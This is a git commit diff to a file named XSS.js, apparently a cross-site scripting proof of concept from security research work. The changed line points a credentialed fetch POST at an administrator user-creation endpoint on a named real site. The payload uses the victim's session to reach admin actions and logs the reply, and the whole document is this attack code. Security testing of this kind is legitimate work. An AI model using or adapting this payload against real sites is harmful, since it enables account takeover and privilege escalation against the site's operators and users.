8d7e9bddaa135c3a5d1f2dac3c35f3e4c41d7242
Yarterss <trey@inspectiv.com>
2025-05-01 20:54:45 -0500

    Update XSS.js

--- XSS.js
+++ XSS.js
@@ -1,4 +1,4 @@
-fetch('https://insight.actionkit.com/dash/pages', {
+fetch('https://insight.actionkit.com/admin/auth/user/add/', {
   method: 'POST',
   credentials: 'include'
 }).then(r => r.text()).then(console.log).catch(console.error);
